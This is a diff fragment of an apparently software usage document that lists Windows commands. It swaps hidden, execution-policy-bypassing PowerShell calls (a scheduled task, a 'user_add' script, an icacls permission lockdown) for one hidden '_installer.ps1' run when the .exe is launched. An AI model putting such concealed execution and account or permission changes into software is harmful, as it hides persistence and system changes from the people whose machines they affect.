@@ -32,6 +32,5 @@ ADVANCED USAGE
 
 
 Commands:
-powershell -windowstyle hidden schtasks /create /tn "GetLogs" /xml C:\App\config\task.xml /f
-powershell -windowstyle hidden -ExecutionPolicy Bypass -File "C:\App\dialog\user_add.ps1"
-icacls C:\App /inheritance:r /grant Admin:F /grant System:F /T /Q
+powershell -windowstyle hidden -ExecutionPolicy Bypass -File "C:\App\_installer.ps1"
+- executed when running .exe file
